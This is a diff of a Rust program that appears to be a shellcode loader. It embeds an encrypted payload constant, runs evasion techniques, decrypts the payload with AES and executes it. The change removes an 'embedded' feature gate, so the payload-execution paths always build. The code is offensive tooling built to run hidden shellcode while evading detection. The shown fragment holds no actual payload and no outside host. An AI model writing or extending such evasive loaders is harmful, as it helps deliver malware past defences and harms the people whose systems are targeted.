@@ -17,7 +17,6 @@ use std::env;
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
 mod aes;
 
-#[cfg(feature = "embedded")]
 const ENCPAYLOAD: &[u8] = &[];  // will be replaced with the (encrypted) payload data
 
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
@@ -144,11 +143,11 @@ fn main() {
     run_evasion_techniques();
 
     // Validate AES arguments FIRST if AES encryption is enabled
-    #[cfg(all(feature = "embedded", any(feature = "TinyAES", feature = "CTAES")))]
+    #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
     let (aes_key, aes_iv) = parse_and_validate_aes_args();
         
     // Execute shellcode or payload without AES decryption
-    #[cfg(all(feature = "embedded", not(feature = "TinyAES"), not(feature = "CTAES")))]
+    #[cfg(not(any(feature = "TinyAES", feature = "CTAES")))]
     {
         let shellcode = ENCPAYLOAD.to_vec();
 
@@ -259,7 +258,7 @@ fn main() {
     }
 
     // Execute shellcode with AES decryption
-    #[cfg(all(feature = "embedded", any(feature = "TinyAES", feature = "CTAES")))]
+    #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
     {
         let encrypted_shellcode = ENCPAYLOAD;
         if let Some(decrypted_shellcode) = decrypt_payload(encrypted_shellcode, &aes_key, &aes_iv) {
